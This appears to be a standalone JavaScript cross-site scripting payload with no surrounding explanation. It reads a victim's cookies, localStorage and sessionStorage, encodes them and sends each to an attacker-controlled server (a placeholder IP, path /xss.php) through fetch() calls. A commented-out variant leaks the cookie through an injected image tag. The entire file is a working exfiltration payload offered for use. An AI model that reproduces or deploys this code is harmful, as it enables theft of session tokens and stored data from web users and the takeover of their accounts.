// server
let ip = "<attacker-IP-address>"
let port = "80"

// cookie
let dataCookie = document.cookie
let encodedDataCookie = encodeURIComponent(dataCookie)
fetch("http://" + ip + ":" + port + "/xss.php?cookie=" + encodedDataCookie)

// cookie alternative (CORS)
// document.write('<img src="http://' + ip + ':' + port + '/xss.php?cookie=' + encodedDataCookie + '" />');

// localStorage
let dataLocalStorage = JSON.stringify(localStorage)
let encodedDataLocalStorage = encodeURIComponent(dataLocalStorage)
fetch("http://" + ip + ":" + port + "/xss.php?localstorage=" + encodedDataLocalStorage)

// sessionStorage
let dataSessionStorage = JSON.stringify(sessionStorage)
let encodedDataSessionStorage = encodeURIComponent(dataSessionStorage)
fetch("http://" + ip + ":" + port + "/xss.php?sessionstorage=" + encodedDataSessionStorage)